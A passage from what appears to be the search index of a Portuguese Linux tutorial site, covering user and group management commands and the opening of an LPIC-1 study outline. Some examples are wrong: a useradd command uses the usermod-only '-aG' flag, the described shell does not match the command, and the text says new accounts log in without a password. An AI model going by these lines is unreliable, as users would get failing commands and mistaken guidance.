<li>Configura\u00e7\u00e3o do NTP</li> </ul>"},{"location":"Universo_NIX/#firewall","title":"Firewall","text":"<ul> <li>Conceito de Firewall</li> <li>Instala\u00e7\u00e3o dos pacotes do iptables</li> <li>Configura\u00e7\u00e3o do script firewall.sh</li> <li>Inicializa\u00e7\u00e3o com o sistema</li> </ul>"},{"location":"Universo_NIX/#virtualizacao","title":"Virtualiza\u00e7\u00e3o","text":"<ul> <li>Conceito de Virtualiza\u00e7\u00e3o</li> <li>Instala\u00e7\u00e3o do Hipervisor Virtualbox</li> <li>Instala\u00e7\u00e3o do Hipervisor QEMU/Virt-manager</li> </ul>"},{"location":"Universo_NIX/#os-50-principais-comandos-do-linux","title":"Os 50 Principais Comandos do Linux","text":"<ul> <li>Revis\u00e3o dos 50 comandos mais utilizados no Linux</li> <li>Exemplos de uso pr\u00e1tico</li> </ul> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Usuarios_e_Grupos-1/","title":"\ud83d\udcc1 Gerenciamento de Usu\u00e1rios e Grupos no Linux - Primeira parte.","text":""},{"location":"Usuarios_e_Grupos-1/#este-tutorial-abrange-os-comandos-essenciais-para-a-criacao-modificacao-e-exclusao-de-usuarios-e-grupos-alem-de-como-gerenciar-suas-permissoes-no-sistema-linux","title":"Este tutorial abrange os comandos essenciais para a cria\u00e7\u00e3o, modifica\u00e7\u00e3o e exclus\u00e3o de usu\u00e1rios e grupos, al\u00e9m de como gerenciar suas permiss\u00f5es no sistema Linux.","text":"<p>1 - Entendendo Usu\u00e1rios e Grupos</p>"},{"location":"Usuarios_e_Grupos-1/#no-linux-usuarios-sao-as-entidades-que-interagem-com-o-sistema-enquanto-grupos-sao-colecoes-de-usuarios-eles-sao-usados-para-organizar-usuarios-e-aplicar-permissoes-de-forma-eficiente","title":"No Linux, usu\u00e1rios s\u00e3o as entidades que interagem com o sistema, enquanto grupos s\u00e3o cole\u00e7\u00f5es de usu\u00e1rios. Eles s\u00e3o usados para organizar usu\u00e1rios e aplicar permiss\u00f5es de forma eficiente.","text":"<ul> <li> <p>Usu\u00e1rio Root: O superusu\u00e1rio com controle total sobre o sistema. Use-o com extrema cautela.</p> </li> <li> <p>Usu\u00e1rios Regulares: Usu\u00e1rios com privil\u00e9gios limitados.</p> </li> <li> <p>Usu\u00e1rios do Sistema: Usu\u00e1rios com privil\u00e9gios espec\u00edficos de servi\u00e7os/aplicativos.</p> </li> <li> <p>Grupos Prim\u00e1rios: O grupo padr\u00e3o ao qual um usu\u00e1rio pertence no momento da cria\u00e7\u00e3o.</p> </li> <li> <p>Grupos Suplementares: Grupos adicionais aos quais um usu\u00e1rio pode pertencer.</p> </li> </ul> <p>2 - Gerenciando Usu\u00e1rios</p>"},{"location":"Usuarios_e_Grupos-1/#criando-um-novo-usuario-use-o-comando-useradd","title":"Criando um Novo Usu\u00e1rio, use o comando useradd.","text":"<pre><code>sudo useradd [op\u00e7\u00f5es] &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#opcoes-comuns","title":"Op\u00e7\u00f5es Comuns:","text":"<ul> <li> <p>-m Cria o diret\u00f3rio home do usu\u00e1rio se ele n\u00e3o existir. (Altamente recomendado)</p> </li> <li> <p>-s : Especifica o shell de login do usu\u00e1rio (ex: /bin/bash, /bin/zsh). <li> <p>-g : Define o grupo prim\u00e1rio do usu\u00e1rio. <li> <p>-G : Adiciona o usu\u00e1rio a grupos suplementares. <li> <p>-c \"\": Adiciona um coment\u00e1rio sobre o usu\u00e1rio (ex: nome completo)."},{"location":"Usuarios_e_Grupos-1/#exemplo","title":"Exemplo:","text":"<pre><code>sudo useradd -m -s /usr/bin/fish -aG www-data,sudo -c \"Jo\u00e3o Silva\" joaosilva\n</code></pre> <p>Aten\u00e7\u00e3o Se a op\u00e7\u00e3o -a for omitida no comando usermod acima, o usu\u00e1rio \u00e9 removido de todos os outros grupos n\u00e3o listados em grupos_adicionais (i.e. o usu\u00e1rio ser\u00e1 membro apenas daqueles grupos em grupos_adicionais).</p>"},{"location":"Usuarios_e_Grupos-1/#isso-cria-o-usuario-joaosilva-com-um-diretorio-home-bash-como-shell-padrao-e-o-adiciona-aos-grupos-www-data-e-sudo","title":"Isso cria o usu\u00e1rio joaosilva com um diret\u00f3rio home, bash como shell padr\u00e3o, e o adiciona aos grupos www-data e sudo.","text":"<p>3 - Definindo a Senha de um Usu\u00e1rio</p>"},{"location":"Usuarios_e_Grupos-1/#apos-criar-um-usuario-ele-esta-logando-sem-senha-voce-precisa-definir-uma-senha-para-ele-usando-o-comando-passwd","title":"Ap\u00f3s criar um usu\u00e1rio, ele est\u00e1 logando sem senha, voc\u00ea precisa definir uma senha para ele usando o comando passwd.","text":"<pre><code>sudo passwd &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#o-sistema-ira-pedir-para-voce-digitar-a-nova-senha-duas-vezes","title":"O sistema ir\u00e1 pedir para voc\u00ea digitar a nova senha duas vezes.","text":""},{"location":"Usuarios_e_Grupos-1/#exemplo_1","title":"Exemplo:","text":"<pre><code>sudo passwd joaosilva\n</code></pre> <p>4 - Modificando um Usu\u00e1rio Existente</p>"},{"location":"Usuarios_e_Grupos-1/#o-comando-usermod-e-usado-para-modificar-as-propriedades-de-um-usuario","title":"O comando usermod \u00e9 usado para modificar as propriedades de um usu\u00e1rio.","text":"<pre><code>sudo usermod [op\u00e7\u00f5es] &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#opcoes-comuns_1","title":"Op\u00e7\u00f5es Comuns:","text":"<ul> <li> <p>-l : Altera o nome de usu\u00e1rio (o diret\u00f3rio home e o grupo prim\u00e1rio n\u00e3o s\u00e3o alterados automaticamente). <li> <p>-d : Altera o diret\u00f3rio home do usu\u00e1rio. <li> <p>-m: Move o conte\u00fado do diret\u00f3rio home antigo para o novo (usado com -d).</p> </li> <li> <p>-s : Altera o shell de login. <li> <p>-g : Altera o grupo prim\u00e1rio. <li> <p>-G : Adiciona o usu\u00e1rio a grupos suplementares (sobrescreve os grupos existentes se n\u00e3o usar -a). <li> <p>-aG : Adiciona o usu\u00e1rio a grupos suplementares sem remover os existentes. (Altamente recomendado) <li> <p>-L: Bloqueia a conta do usu\u00e1rio.</p> </li> <li> <p>-U: Desbloqueia a conta do usu\u00e1rio.</p> </li>"},{"location":"Usuarios_e_Grupos-1/#exemplos","title":"Exemplos:","text":""},{"location":"Usuarios_e_Grupos-1/#para-adicionar-joaosilva-ao-grupo-docker-sem-remover-outros-grupos","title":"Para adicionar joaosilva ao grupo docker sem remover outros grupos:","text":"<pre><code>sudo usermod -aG docker joaosilva\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#para-mudar-o-nome-de-usuario-de-joaosilva-para-jsilva","title":"Para mudar o nome de usu\u00e1rio de joaosilva para jsilva:","text":"<pre><code>sudo usermod -l jsilva joaosilva\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#importante-apos-renomear-um-usuario-com-l-o-diretorio-home-e-o-grupo-primario-ainda-terao-o-nome-antigo-voce-precisara-renomea-los-manualmente","title":"Importante: Ap\u00f3s renomear um usu\u00e1rio com -l, o diret\u00f3rio home e o grupo prim\u00e1rio ainda ter\u00e3o o nome antigo. Voc\u00ea precisar\u00e1 renome\u00e1-los manualmente:","text":"<pre><code>sudo mv /home/joaosilva /home/jsilva\nsudo groupmod -n jsilva joaosilva\nsudo usermod -d /home/jsilva -m jsilva\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#adiconar-um-usuario-a-um-grupo-especifico-com-o-comando-adduser","title":"Adiconar um usu\u00e1rio \u00e1 um grupo espec\u00edfico com o comando adduser:","text":"<pre><code>sudo adduser jsilva tape\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#adiconar-um-usuario-a-um-grupo-especifico-com-o-comando-gpasswd","title":"Adiconar um usu\u00e1rio \u00e1 um grupo espec\u00edfico com o comando gpasswd:","text":"<pre><code>sudo gpasswd -a jsilva tape\n</code></pre> <p>5 - Excluindo um Usu\u00e1rio</p>"},{"location":"Usuarios_e_Grupos-1/#use-o-comando-userdel-para-remover-um-usuario","title":"Use o comando userdel para remover um usu\u00e1rio.","text":"<pre><code>sudo userdel [op\u00e7\u00f5es] &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#opcoes-comuns_2","title":"Op\u00e7\u00f5es Comuns:","text":"<ul> <li>-r: Remove o diret\u00f3rio home do usu\u00e1rio e o mail spool. (Altamente recomendado)</li> </ul>"},{"location":"Usuarios_e_Grupos-1/#exemplo_2","title":"Exemplo:","text":"<pre><code>sudo userdel -r joaosilva\n</code></pre> <p>6 - Gerenciando Grupos</p>"},{"location":"Usuarios_e_Grupos-1/#31-criando-um-novo-grupo","title":"3.1. Criando um Novo Grupo","text":""},{"location":"Usuarios_e_Grupos-1/#use-o-comando-groupadd-para-criar-um-novo-grupo","title":"Use o comando groupadd para criar um novo grupo.","text":"<pre><code>sudo groupadd [op\u00e7\u00f5es] &lt;nome_do_grupo&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_3","title":"Exemplo:","text":"<pre><code>sudo groupadd desenvolvedores\n</code></pre> <p>7 - Modificando um Grupo Existente</p>"},{"location":"Usuarios_e_Grupos-1/#o-comando-groupmod-e-usado-para-modificar-as-propriedades-de-um-grupo","title":"O comando groupmod \u00e9 usado para modificar as propriedades de um grupo.","text":"<pre><code>sudo groupmod [op\u00e7\u00f5es] &lt;nome_do_grupo&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#opcoes-comuns_3","title":"Op\u00e7\u00f5es Comuns:","text":"<ul> <li>-n : Altera o nome do grupo."},{"location":"Usuarios_e_Grupos-1/#exemplo_4","title":"Exemplo:","text":""},{"location":"Usuarios_e_Grupos-1/#para-mudar-o-nome-do-grupo-desenvolvedores-para-devs","title":"Para mudar o nome do grupo desenvolvedores para devs:","text":"<pre><code>   sudo groupmod -n devs desenvolvedores\n</code></pre> <p>8 - Excluindo um Grupo</p>"},{"location":"Usuarios_e_Grupos-1/#use-o-comando-groupdel-para-remover-um-grupo","title":"Use o comando groupdel para remover um grupo.","text":"<pre><code>sudo groupdel &lt;nome_do_grupo&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_5","title":"Exemplo:","text":"<pre><code>sudo groupdel devs\n</code></pre> <p>9 - Gerenciando Membros do Grupo</p>"},{"location":"Usuarios_e_Grupos-1/#adicionando-usuarios-a-um-grupo","title":"Adicionando Usu\u00e1rios a um Grupo","text":""},{"location":"Usuarios_e_Grupos-1/#para-adicionar-um-usuario-a-um-grupo-existente-a-maneira-mais-comum-e-usar-usermod-ag","title":"Para adicionar um usu\u00e1rio a um grupo existente, a maneira mais comum \u00e9 usar usermod -aG.","text":"<pre><code>sudo usermod -aG &lt;nome_do_grupo&gt; &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_6","title":"Exemplo:","text":"<pre><code>sudo usermod -aG www-data joaosilva\n</code></pre> <p>10 - Removendo Usu\u00e1rios de um Grupo</p>"},{"location":"Usuarios_e_Grupos-1/#para-remover-um-usuario-de-um-grupo-voce-pode-usar-gpasswd-ou-deluser-dependendo-da-distribuicao","title":"Para remover um usu\u00e1rio de um grupo, voc\u00ea pode usar gpasswd ou deluser (dependendo da distribui\u00e7\u00e3o).","text":""},{"location":"Usuarios_e_Grupos-1/#usando-gpasswd-mais-comum-e-recomendado","title":"Usando gpasswd (mais comum e recomendado):","text":"<pre><code>sudo gpasswd -d &lt;nome_do_usuario&gt; &lt;nome_do_grupo&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_7","title":"Exemplo:","text":"<pre><code>sudo gpasswd -d joaosilva www-data\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#usando-deluser-disponivel-em-algumas-distribuicoes-como-debianubuntu","title":"Usando deluser (dispon\u00edvel em algumas distribui\u00e7\u00f5es como Debian/Ubuntu):","text":"<pre><code>sudo deluser &lt;nome_do_usuario&gt; &lt;nome_do_grupo&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_8","title":"Exemplo:","text":"<pre><code>sudo deluser joaosilva www-data\n</code></pre> <p>11 - Visualizando Informa\u00e7\u00f5es de Usu\u00e1rios e Grupos</p>"},{"location":"Usuarios_e_Grupos-1/#listar-usuarios","title":"Listar Usu\u00e1rios","text":""},{"location":"Usuarios_e_Grupos-1/#as-informacoes-dos-usuarios-sao-armazenadas-em-etcpasswd-voce-pode-visualiza-lo-com-cat-ou-less","title":"As informa\u00e7\u00f5es dos usu\u00e1rios s\u00e3o armazenadas em /etc/passwd. Voc\u00ea pode visualiz\u00e1-lo com cat ou less.","text":"<pre><code>cat /etc/passwd\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#listar-grupos","title":"Listar Grupos","text":""},{"location":"Usuarios_e_Grupos-1/#as-informacoes-dos-grupos-sao-armazenadas-em-etcgroup","title":"As informa\u00e7\u00f5es dos grupos s\u00e3o armazenadas em /etc/group.","text":"<pre><code>cat /etc/group\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#visualizar-informacoes-de-um-usuario-especifico","title":"Visualizar Informa\u00e7\u00f5es de um Usu\u00e1rio Espec\u00edfico","text":""},{"location":"Usuarios_e_Grupos-1/#use-o-comando-id-para-ver-o-id-do-usuario-grupo-primario-e-grupos-suplementares-de-um-usuario","title":"Use o comando id para ver o ID do usu\u00e1rio, grupo prim\u00e1rio e grupos suplementares de um usu\u00e1rio.","text":"<pre><code>id &lt;nome_do_usuario&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_9","title":"Exemplo:","text":"<pre><code>id joaosilva\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#54-visualizar-membros-de-um-grupo","title":"5.4. Visualizar Membros de um Grupo","text":"<pre><code>grep &lt;nome_do_grupo&gt; /etc/group\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_10","title":"Exemplo:","text":"<pre><code>grep sudo /etc/group\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#ou-em-algumas-distribuicoes-voce-pode-usar-members-se-instalado","title":"Ou, em algumas distribui\u00e7\u00f5es, voc\u00ea pode usar members (se instalado).","text":"<pre><code>members &lt;nome_do_grupo&gt;\n</code></pre> <p>12 - Permiss\u00f5es de Arquivos e Diret\u00f3rios</p>"},{"location":"Usuarios_e_Grupos-1/#as-permissoes-no-linux-sao-baseadas-em-usuario-grupo-e-outros","title":"As permiss\u00f5es no Linux s\u00e3o baseadas em usu\u00e1rio, grupo e outros.","text":"<ul> <li> <p>r (leitura): 4</p> </li> <li> <p>w (escrita): 2</p> </li> <li> <p>x (execu\u00e7\u00e3o): 1</p> </li> </ul>"},{"location":"Usuarios_e_Grupos-1/#a-combinacao-dessas-permissoes-e-um-numero-octal","title":"A combina\u00e7\u00e3o dessas permiss\u00f5es \u00e9 um n\u00famero octal.","text":""},{"location":"Usuarios_e_Grupos-1/#exemplo_11","title":"Exemplo:","text":"<ul> <li>rwx (4+2+1 = 7), rw- (4+2+0 = 6), r-x (4+0+1 = 5).</li> </ul>"},{"location":"Usuarios_e_Grupos-1/#61-alterando-permissoes-chmod","title":"6.1. Alterando Permiss\u00f5es (chmod)","text":""},{"location":"Usuarios_e_Grupos-1/#use-chmod-para-alterar-as-permissoes-de-um-arquivo-ou-diretorio","title":"Use chmod para alterar as permiss\u00f5es de um arquivo ou diret\u00f3rio.","text":"<pre><code>chmod &lt;permiss\u00f5es_octais&gt; &lt;arquivo/diret\u00f3rio&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_12","title":"Exemplo:","text":""},{"location":"Usuarios_e_Grupos-1/#dar-ao-proprietario-grupo-e-outros-permissao-total-leitura-escrita-execucao-para-um-script","title":"Dar ao propriet\u00e1rio, grupo e outros permiss\u00e3o total (leitura, escrita, execu\u00e7\u00e3o) para um script:","text":"<pre><code>chmod 777 meu_script.sh\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#dar-ao-proprietario-leituraescrita-ao-grupo-leitura-e-a-outros-nenhuma-permissao-para-um-arquivo","title":"Dar ao propriet\u00e1rio leitura/escrita, ao grupo leitura e a outros nenhuma permiss\u00e3o para um arquivo:","text":"<pre><code>    chmod 640 meu_arquivo.txt\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#alterando-o-proprietario-chown","title":"Alterando o Propriet\u00e1rio (chown)","text":""},{"location":"Usuarios_e_Grupos-1/#use-chown-para-alterar-o-proprietario-de-um-arquivo-ou-diretorio","title":"Use chown para alterar o propriet\u00e1rio de um arquivo ou diret\u00f3rio.","text":"<pre><code>sudo chown &lt;novo_proprietario&gt; &lt;arquivo/diret\u00f3rio&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_13","title":"Exemplo:","text":"<pre><code>sudo chown joaosilva meu_arquivo.txt\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#63-alterando-o-grupo-proprietario-chgrp","title":"6.3. Alterando o Grupo Propriet\u00e1rio (chgrp)","text":""},{"location":"Usuarios_e_Grupos-1/#use-chgrp-para-alterar-o-grupo-proprietario-de-um-arquivo-ou-diretorio","title":"Use chgrp para alterar o grupo propriet\u00e1rio de um arquivo ou diret\u00f3rio.","text":"<pre><code>sudo chgrp &lt;novo_grupo&gt; &lt;arquivo/diret\u00f3rio&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_14","title":"Exemplo:","text":"<pre><code>sudo chgrp devs meu_arquivo.txt\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#voce-tambem-pode-usar-chown-para-alterar-o-proprietario-e-o-grupo-simultaneamente","title":"Voc\u00ea tamb\u00e9m pode usar chown para alterar o propriet\u00e1rio e o grupo simultaneamente:","text":"<pre><code>sudo chown &lt;proprietario&gt;:&lt;grupo&gt; &lt;arquivo/diret\u00f3rio&gt;\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#exemplo_15","title":"Exemplo:","text":"<pre><code>sudo chown joaosilva:devs meu_arquivo.txt\n</code></pre>"},{"location":"Usuarios_e_Grupos-1/#consideracoes-finais","title":"Considera\u00e7\u00f5es Finais","text":"<ul> <li> <p>Sempre use sudo: A maioria dos comandos de gerenciamento de usu\u00e1rios e grupos requer privil\u00e9gios de superusu\u00e1rio.</p> </li> <li> <p>Seguran\u00e7a: Evite dar permiss\u00f5es excessivas. Siga o princ\u00edpio do menor privil\u00e9gio.</p> </li> <li> <p>Documenta\u00e7\u00e3o: Consulte as p\u00e1ginas man para obter informa\u00e7\u00f5es detalhadas sobre cada comando (ex: man useradd).</p> </li> <li> <p>Backup: Sempre fa\u00e7a backup de arquivos de configura\u00e7\u00e3o importantes (como /etc/passwd, /etc/group, /etc/shadow) antes de fazer grandes altera\u00e7\u00f5es.</p> </li> </ul> <p>That's all folks</p>"},{"location":"Usuarios_e_Grupos-2/","title":"\ud83d\udcc1 Gerenciamento de Usu\u00e1rios e Grupos no Linux - Segunda parte.","text":""},{"location":"Usuarios_e_Grupos-2/#como-devemos-proceder-para-adicionar-um-usuario-a-um-grupo-no-sistema-operacional-linux","title":"Como devemos proceder para adicionar um usu\u00e1rio a um grupo no sistema operacional Linux?","text":"<p>Tornar um usu\u00e1rio membro de um grupo \u00e9 uma tarefa simples, que pode ser realizada com o uso dos comandos useradd, adduser, gpasswd ou usermod no terminal.</p> <p>Os comandos useradd e adduser (que \u00e9 um script na verdade) permitem criar um novo usu\u00e1rio no sistema, e al\u00e9m disso tamb\u00e9m permitem adicionar um usu\u00e1rio j\u00e1 existente a um grupo determinado. J\u00e1 o comando usermod permite modificar a conta de um usu\u00e1rio, e isso inclui torn\u00e1-lo membro de grupos existentes no sistema. Tamb\u00e9m vamos mostrar o comando gpasswd, que entre outras coisas permite gerenciar os grupos do sistema.</p>"},{"location":"Usuarios_e_Grupos-2/#grupos-primarios-e-grupos-secundarios","title":"Grupos prim\u00e1rios e grupos secund\u00e1rios:","text":"<ul> <li> <p>Grupo Prim\u00e1rio \u2013 \u00c9 o grupo criado juntamente com o usu\u00e1rio. Normalmente \u00e9 igual ao seu nome de login.</p> </li> <li> <p>Grupos Secund\u00e1rios \u2013 Os usu\u00e1rios tamb\u00e9m podem ser membros de outros grupos no sistema Linux. S\u00e3o muito \u00fateis para realizar compartilhamento de arquivos, diret\u00f3rios, dar permiss\u00f5es e outros elementos.</p> </li> </ul> <p>As informa\u00e7\u00f5es sobre os grupos do sistema e usu\u00e1rios membros ficam armazenadas no arquivo /etc/group, o qual possui um lista dos grupos e seus respectivos membros.</p>"},{"location":"Usuarios_e_Grupos-2/#exemplos-de-comandos-para-adicionar-um-usuario-a-um-grupo","title":"Exemplos de comandos para adicionar um usu\u00e1rio a um grupo:","text":"<ol> <li>Vamos adicionar o usu\u00e1rio monica ao grupo marketing:</li> </ol> <pre><code>adduser monica marketing\n</code></pre> <ol> <li>Tamb\u00e9m podemos adicionar um usu\u00e1rio a um grupo usando o comando gpasswd:</li> </ol> <pre><code>gpasswd -a usu\u00e1rio grupo\n</code></pre> <p>Por exemplo, adicionando monica ao grupo rh:</p> <pre><code>gpasswd -a monica rh\n</code></pre> <ol> <li>Podemos definir um novo grupo prim\u00e1rio para o usu\u00e1rio com o comando usermod seguido da op\u00e7\u00e3o -g. Por exemplo, vamos trocar o grupo prim\u00e1rio da monica (que \u00e9 \u201cmonica\u201d) para grupo engenheiros:</li> </ol> <pre><code>usermod -g engenheiros monica\n</code></pre> <ol> <li>Ainda com o comando usermod, podemos tornar o usu\u00e1rio membro de v\u00e1rios grupos secund\u00e1rios (suplementares) especificados ao mesmo tempo. Vamos alterar a lista de grupos secund\u00e1rios e tornar a usu\u00e1ria monica membro dos grupos planilhas e memorandos:</li> </ol> <pre><code>usermod -G planilhas,memorandos monica\n</code></pre> <ol> <li>Note que no exemplo anterior o nosso usu\u00e1rio foi adicionado aos grupos planilhas e memorandos, por\u00e9m foi retirado dos outros grupos secund\u00e1rios dos quais era membro,como o grupo rh.</li> </ol> <p>Para que o usu\u00e1rio continue sendo membro dos grupos e seja acrescentado a novos grupos, sem deixar de ser membro dos anteriores, acrescente a op\u00e7\u00e3o -a ao comando anterior:</p> <pre><code>usermod -aG planilhas,memorandos monica\n</code></pre>"},{"location":"Usuarios_e_Grupos-2/#verificando","title":"Verificando","text":"<p>Verifique se o usu\u00e1rio foi adicionado a um grupo usando o comando groups seguido do nome do usu\u00e1rio:</p> <pre><code>groups monica\n</code></pre> <p>Os grupos dos quais o usu\u00e1rio \u00e9 membro aparecem listados em sequ\u00eancia, sendo que o primeiro grupo \u00e9 o grupo prim\u00e1rio do usu\u00e1rio e os demais s\u00e3o os grupos secund\u00e1rios.</p>"},{"location":"Usuarios_e_Grupos-2/#removendo-usuarios-de-um-grupo-no-linux","title":"Removendo usu\u00e1rios de um grupo no Linux","text":"<p>E se quisermos remover um usu\u00e1rio de um grupo? Podemos para isso usar o comando deluser, com a sintaxe a seguir:</p> <pre><code>deluser usu\u00e1rio grupo\n</code></pre> <p>Por exemplo, vamos excluir a monica do grupo de memorandos:</p> <pre><code>deluser monica memorandos\n</code></pre> <p>Tome cuidado para n\u00e3o esquecer de incluir o nome do grupo ao executar esse comando,pois voc\u00ea pode acabar excluindo a conta do usu\u00e1rio do sistema em vez de apenas retir\u00e1-lo de um grupo!</p> <p>Uma forma mais segura de excluir um usu\u00e1rio de um grupo \u00e9 por meio do comando gpasswd, como segue a sintaxe:</p> <pre><code>gpasswd -d usu\u00e1rio grupo\n</code></pre>"},{"location":"Usuarios_e_Grupos-2/#remover-o-usuario-monica-do-grupo-planilhas","title":"Remover o usu\u00e1rio monica do grupo planilhas:","text":"<pre><code>gpasswd -d monica planilhas\n</code></pre>"},{"location":"Visao_Geral/","title":"\ud83c\udf10 Guia de Estudos - Certifica\u00e7\u00e3o LPIC-1","text":""},{"location":"Visao_Geral/#este-guia-contem-os-principais-topicos-cobrados-no-exame-lpic-1","title":"Este guia cont\u00e9m os principais t\u00f3picos cobrados no exame LPIC-1.","text":"<p>P\u00e1gina oficial da LPI</p>"},{"location":"Visao_Geral/#sumario","title":"Sum\u00e1rio","text":"<ul> <li>Exame 101</li> <li>T\u00f3pico 101 - Arquitetura do Sistema</li> <li>T\u00f3pico 102 - Instala\u00e7\u00e3o e Gerenciamento de Pacotes</li> <li>T\u00f3pico 103 - Comandos Linux</li> <li>T\u00f3pico 104 - Dispositivos, Sistemas de Arquivos e FHS</li> <li>Exame 102</li> <li>T\u00f3pico 105 - Shell e Scripts</li> <li>T\u00f3pico 106 - Interfaces de Usu\u00e1rios e Desktops</li> <li>T\u00f3pico 107 - Tarefas Administrativas</li> <li>T\u00f3pico 108 - Servi\u00e7os Essenciais do Sistema</li> <li>T\u00f3pico 109 - Fundamentos de Rede</li> <li>T\u00f3pico 110 - Seguran\u00e7a</li> </ul>"},{"location":"Visao_Geral/#exame-101-topicos-101-a-104","title":"Exame 101 (T\u00f3picos 101 a 104)","text":""},{"location":"Visao_Geral/#topico-101-arquitetura-do-sistema","title":"T\u00f3pico 101 - Arquitetura do Sistema","text":""},{"location":"Visao_Geral/#1011-identificar-e-editar-configuracoes-de-hardware","title":"101.1 Identificar e editar configura\u00e7\u00f5es de hardware","text":"<p>\u00c1reas de Conhecimento</p> <ol> <li>Habilitar/desabilitar perif\u00e9ricos integrados  </li> <li>Configurar sistemas com perif\u00e9ricos externos (ex.: teclado)  </li> <li>Diferenciar tipos de dispositivos de armazenamento  </li> <li>Coldplug x Hotplug  </li> <li>Determinar recursos de hardware  </li> <li>Utilizar ferramentas de listagem (<code>lsusb</code>, <code>lspci</code>, etc.)  </li> <li>Manipular dispositivos USB  </li> <li>Conceitos: <code>sysfs</code>, <code>udev</code>, <code>dbus</code> </li> </ol> <p>Ferramentas e Arquivos </p> <ul> <li>Diret\u00f3rios \u2192 <code>/sys/</code>, <code>/proc/</code>, <code>/dev/</code> </li> <li>M\u00f3dulos \u2192 <code>modprobe</code>, <code>lsmod</code> </li> <li>Listagem \u2192 <code>lspci</code>, <code>lsusb</code> </li> </ul>"},{"location":"Visao_Geral/#1012-inicio-boot-de-sistema","title":"101.2 In\u00edcio (Boot) de Sistema","text":"<p>\u00c1reas de Conhecimento</p> <ul> <li>Comandos/op\u00e7\u00f5es de bootloader e kernel  </li> <li>Sequ\u00eancia de inicializa\u00e7\u00e3o do BIOS  </li> <li>Conhecimento do SysVinit e systemd </li> <li>No\u00e7\u00f5es de Upstart </li> <li>Logs de eventos de inicializa\u00e7\u00e3o  </li> </ul> <p>Ferramentas e Arquivos </p> <ul> <li>Logs \u2192 <code>dmesg</code> </li> <li>Firmware \u2192 <code>BIOS</code> </li> <li>Boot \u2192 <code>bootloader</code>, <code>kernel</code>, <code>initramfs</code> </li> <li>Inicializa\u00e7\u00e3o \u2192 <code>init</code>, <code>SysVinit</code>, <code>systemd</code> </li> </ul>"},{"location":"Visao_Geral/#1013-runlevels-boot-targets-desligar-e-reiniciar","title":"101.3 Runlevels, Boot Targets, Desligar e Reiniciar","text":"<p>\u00c1reas de Conhecimento</p> <ul> <li>Definir runlevel e boot target padr\u00e3o  </li> <li>Alternar entre runlevels/boot targets (modo single user)  </li> <li>Desligar/reiniciar pela linha de comando  </li> <li>Avisar usu\u00e1rios antes de altera\u00e7\u00f5es cr\u00edticas  </li> <li>Encerrar processos corretamente  </li> </ul> <p>Ferramentas e Arquivos </p> <ul> <li>Configura\u00e7\u00e3o \u2192 <code>/etc/inittab</code>, <code>/etc/init.d/</code>, <code>/etc/systemd/</code>, <code>/usr/lib/systemd/</code> </li> <li>Gerenciamento \u2192 <code>shutdown</code>, <code>init</code>, <code>telinit</code> </li> <li>Systemd \u2192 <code>systemd</code>, <code>systemctl</code> </li> <li>Comunica\u00e7\u00e3o \u2192 <code>wall</code> </li> </ul>"},{"location":"Visao_Geral/#topico-102-instalacao-e-gerenciamento-de-pacotes","title":"T\u00f3pico 102 - Instala\u00e7\u00e3o e Gerenciamento de Pacotes","text":""},{"location":"Visao_Geral/#exemplos-de-ferramentas-por-categoria","title":"Exemplos de ferramentas por categoria:","text":"\u00c1rea Utilit\u00e1rios Parti\u00e7\u00f5es e sistemas de arquivos <code>/</code>, <code>/var</code>, <code>/home</code>, <code>/boot</code>, swap Bootloader (GRUB) <code>menu.lst</code>, <code>grub.cfg</code>, <code>grub-install</code>, <code>grub-mkconfig</code>, <code>MBR</code> Bibliotecas compartilhadas <code>ldd</code>, <code>ldconfig</code>, <code>/etc/ld.so.conf</code>, <code>LD_LIBRARY_PATH</code> Debian <code>dpkg</code>, <code>apt-get</code>, <code>apt-cache</code>, <code>aptitude</code>, <code>/etc/apt/sources.list</code> RedHat <code>rpm</code>, <code>yum</code>, <code>/etc/yum.conf</code>, <code>/etc/yum.repos.d/</code> Virtualiza\u00e7\u00e3o M\u00e1quinas Virtuais, Cont\u00eaineres, <code>cloud-init</code>, chaves SSH"},{"location":"Visao_Geral/#topico-103-comandos-linux","title":"T\u00f3pico 103 - Comandos Linux","text":""},{"location":"Visao_Geral/#organizados-por-tema","title":"Organizados por tema:","text":"<ul> <li>Linha de Comando \u2192 <code>bash</code>, <code>echo</code>, <code>env</code>, <code>history</code>, <code>alias</code>, <code>PATH</code> </li> <li>Filtros de Texto \u2192 <code>cat</code>, <code>cut</code>, <code>head</code>, <code>sed</code>, <code>sort</code>, <code>uniq</code>, <code>wc</code> </li> <li>Gerenciamento de Arquivos \u2192 <code>cp</code>, <code>mv</code>, <code>rm</code>, <code>find</code>, 